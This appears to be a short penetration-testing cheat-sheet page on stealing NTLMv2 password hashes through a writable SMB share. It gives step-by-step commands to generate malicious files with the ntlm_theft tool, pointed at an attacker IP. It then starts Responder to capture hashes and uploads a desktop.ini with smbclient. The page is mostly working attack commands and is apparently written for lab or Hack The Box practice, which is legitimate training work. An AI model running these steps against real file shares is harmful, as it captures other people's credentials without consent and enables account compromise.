# SMB Responder

When you can access to a SMB file share, you may want to upload malicious files that trigger to send password hashes to Kali system.&#x20;

## ntlm\_theft tool&#x20;

[https://github.com/Greenwolf/ntlm\_theft](https://github.com/Greenwolf/ntlm_theft)\
A tool for generating multiple types of NTLMv2 hash theft files. &#x20;

```bash
# Prepare malivious document files 
git clone https://github.com/Greenwolf/ntlm_theft
cd ./ntlm_theft
python3 ntlm_theft.py --generate all --server $LHOST --filename baby2
python3 ntlm_theft.py --generate all --server <Kali IP> --filename <local directory>
python3 ntlm_theft.py -g all -s 192.168.45.183 -f htb

# Start Responder 
sudo responder -I tun0 -v

# Upload the files for example 
cd htb 
smbclient //$RHOST/Shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
smb: \> mput desktop.ini
# Wait for a while. You may see the following response back to the Responder 

# Use automated upload script in python
# https://github.com/iptracej/PentestCode/blob/main/web/common/upload.py 
```

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>
